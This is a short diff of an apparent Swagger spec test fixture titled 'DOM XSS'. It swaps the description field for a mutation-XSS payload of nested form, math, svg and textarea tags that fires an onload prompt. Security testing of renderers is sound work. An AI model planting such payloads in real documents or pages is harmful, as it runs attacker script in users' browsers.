@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   version: "0.0.1"
   title: DOM XSS
-  description: <form><form><mglyph><svg><mtext><textarea><path id="</textarea><svg onload=prompt(/XSS1337/)>"></form>
+  description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><svg/onload=prompt(/XSS/)>"></form>
 paths:
   /:
     get:
